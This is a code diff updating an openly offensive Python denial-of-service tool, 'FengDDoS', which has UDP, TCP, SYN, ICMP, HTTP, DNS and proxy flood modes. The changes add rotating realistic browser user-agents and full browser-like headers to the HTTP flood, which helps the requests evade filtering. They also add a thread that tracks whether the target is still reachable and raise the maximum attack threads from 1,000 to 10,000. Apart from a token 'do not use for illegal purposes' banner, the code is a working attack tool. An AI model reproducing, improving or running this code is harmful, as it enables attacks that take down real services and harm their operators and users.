@@ -22,6 +22,16 @@ class color:
     BLUE = "\033[94m"
     CYAN = "\033[96m"
 
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+
 class AttackStats:
     def __init__(self):
         self.total_sent = 0
@@ -61,15 +71,35 @@ stats = AttackStats()
 def show_banner():
     os.system("clear")
     os.system("figlet FengDDoS")
-    
     print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
     print(f"{color.BOLD} Author :{color.RESET} FengPwner")
     print(f"{color.BOLD} Github :{color.RESET} https://github.com/FengPwner")
     print(f"{color.BOLD} Atomgit:{color.RESET} https://atomgit.com/FengPwner")
     print(f"{color.BOLD} CSDN   :{color.RESET} https://blog.csdn.net/2302_76189356")
-    print(f"{color.BOLD} Version:{color.RESET} S1.2")
+    print(f"{color.BOLD} Version:{color.RESET} S1.3")
     print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
     print(f"{color.RED}{color.BOLD} [!] Do not use for illegal purposes!{color.RESET}\n")
+
+def check_connectivity(target_ip, target_port, interval=10):
+    while stats.running:
+        status = "UNKNOWN"
+        latency = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            start = time.time()
+            s.connect((target_ip, target_port))
+            latency = (time.time() - start) * 1000
+            status = "ALIVE"
+            s.close()
+        except Exception:
+            status = "UNREACHABLE"
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        if latency is not None:
+            print(f"{color.GREEN}[{timestamp}] [Connectivity] {target_ip}:{target_port} -> {status} (RTT: {latency:.1f} ms){color.RESET}")
+        else:
+            print(f"{color.RED}[{timestamp}] [Connectivity] {target_ip}:{target_port} -> {status}{color.RESET}")
+        time.sleep(interval)
 
 def udp_flood(target_ip, target_port, packet_size):
     while stats.running:
@@ -128,7 +158,17 @@ def http_flood(target_url, port, packet_size):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(2)
             s.connect((target_url, port))
-            request = f"GET / HTTP/1.1\r\nHost: {target_url}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/91.0','Safari/537.36'])}\r\nAccept: */*\r\n\r\n"
+            ua = random.choice(USER_AGENTS)
+            request = (
+                f"GET / HTTP/1.1\r\n"
+                f"Host: {target_url}\r\n"
+                f"User-Agent: {ua}\r\n"
+                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                f"Accept-Language: en-US,en;q=0.5\r\n"
+                f"Accept-Encoding: gzip, deflate\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+            )
             s.send(request.encode())
             stats.increment()
             s.close()
@@ -231,6 +271,9 @@ def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=No
     monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
     monitor_thread.start()
 
+    conn_thread = threading.Thread(target=check_connectivity, args=(target_ip, target_port, 10), daemon=True)
+    conn_thread.start()
+
     attack_threads = []
     for _ in range(threads):
         if mode == "proxy" and proxy_list:
@@ -308,16 +351,16 @@ while True:
         if mode not in ["udp","tcp","syn","icmp","http","dns","proxy"]: continue
 
         while True:
-            t_input = input(f"{color.BLUE}[4/4] Threads (1~1000, type 'exit' to quit): {color.RESET}")
+            t_input = input(f"{color.BLUE}[4/4] Threads (1~10000, type 'exit' to quit): {color.RESET}")
             if t_input.strip().lower() == 'exit':
                 print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                 sys.exit(0)
             try:
                 threads = int(t_input)
-                if not (1 <= threads <= 1000): raise ValueError("Threads out of range")
+                if not (1 <= threads <= 10000): raise ValueError("Threads out of range")
                 break
             except ValueError:
-                print(f"{color.RED}[-] Error: Invalid threads. Please enter a number between 1 and 1000.{color.RESET}")
+                print(f"{color.RED}[-] Error: Invalid threads. Please enter a number between 1 and 10000.{color.RESET}")
                 action = handle_error(allow_edit=True)
                 if action == 'y': break
                 elif action == 'e': continue
@@ -325,6 +368,7 @@ while True:
 
         os.system("clear")
         print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
+        print(f"{color.YELLOW}[*] Connectivity check runs every 10 seconds.{color.RESET}\n")
         run_attack(target_ip, target_port, mode, 64, threads)
         handle_error(allow_edit=False)
     except Exception as e:
